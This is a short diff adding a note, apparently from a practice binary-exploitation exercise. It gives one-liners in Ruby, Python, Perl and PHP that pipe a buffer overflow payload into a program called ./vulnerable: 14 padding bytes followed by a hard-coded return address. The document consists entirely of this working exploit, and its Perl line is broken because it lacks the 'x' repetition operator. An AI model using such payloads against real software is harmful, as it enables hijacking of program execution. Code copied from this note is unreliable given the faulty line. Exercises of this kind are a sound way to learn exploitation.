@@ -1,0 +1,9 @@
+pipe the payload via language of your choice (or available one)
+
+ruby -e 'print "A"*14 + "\x67\x05\x40"' | ./vulnerable
+
+python -c 'print "A"*14 + "\x67\x05\x40"' | ./vulnerable
+
+perl -e 'print "A"14 . "\x67\x05\x40"' | ./vulnerable
+
+php -r 'echo str_repeat("A",14) . "\x67\x05\x40";' | ./vulnerable
